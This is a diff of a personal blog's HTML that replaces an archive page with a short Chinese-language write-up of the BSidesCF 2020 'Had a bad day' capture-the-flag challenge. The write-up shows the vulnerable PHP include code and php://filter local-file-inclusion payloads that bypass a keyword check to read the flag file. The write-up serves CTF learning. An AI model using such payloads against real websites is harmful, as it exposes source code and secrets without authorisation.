@@ -6,18 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020/1 | Xun9er&#39;s blog</title>
+  <title>Had a bad day | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一个白的不能再白的小白">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Xun9er&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2020/01/index.html">
+  <meta name="description" content="[BSidesCF 2020]Had a bad day">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Had a bad day">
+<meta property="og:url" content="http://yoursite.com/2020/07/11/[BSidesCF 2020]Had a bad day/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="一个白的不能再白的小白">
+<meta property="og:description" content="[BSidesCF 2020]Had a bad day">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-09-01T14:17:14.125Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Xun9er&#39;s blog">
-<meta name="twitter:description" content="一个白的不能再白的小白">
+<meta name="twitter:title" content="Had a bad day">
+<meta name="twitter:description" content="[BSidesCF 2020]Had a bad day">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
   
@@ -174,141 +175,207 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-[BSidesCF 2020]Had a bad day" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Had a bad day
+    </h1>
+  
+
+        
+        <a href="/2020/07/11/[BSidesCF 2020]Had a bad day/" class="archive-article-date">
+  	<time datetime="2020-07-11T13:12:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-11</time>
+</a>
+    <!--字数统计-->
+        
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">163字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">1分</span>
+      </span>
+    </span>
+</div>
+          
+	
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><a id="more"></a>
+<ul>
+<li>php伪协议</li>
+</ul>
+<p>看到url的样子就先试试可不可以读到源码：<br><code>?category=php://filter/read=convert.base64-encode/resource=index</code><br>比较重要的一段：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">				$file = $_GET[&apos;category&apos;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &apos;.php&apos;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看来请求里必须要有woofers/meowers/index才可。<br><strong>重点来啦</strong><br>这里就有两种写法：<br>第一种：<code>php://filter/read=convert.base64-encode/resource=meowers/../flag</code>flag和meowers.php同目录<br>第二种：<code>php://filter/read=convert.base64-encode/meowers/resource=flag</code>php://filter伪协议可以套一层协议  </p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/05/DVWA-CSRF/" class="archive-article-date">
-  	<time datetime="2020-01-05T02:23:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/05/DVWA-CSRF/">DVWA--CSRF</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/07/11/[BSidesCF 2020]Had a bad day/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/04/notes on python/" class="archive-article-date">
-  	<time datetime="2020-01-04T14:20:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2020/09/01/tricks/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          misc tricks&#39;
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/05/17/记第一次出题/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">记第一次出题</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/04/notes on python/">notes on python</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-number">1.</span> <span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/04/DVWA-command-injection/" class="archive-article-date">
-  	<time datetime="2020-01-04T13:05:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/04/DVWA-command-injection/">DVWA-command injection</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/04/DVWA-brute/" class="archive-article-date">
-  	<time datetime="2020-01-04T08:53:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/04/DVWA-brute/">DVWA--brute</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -331,8 +398,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
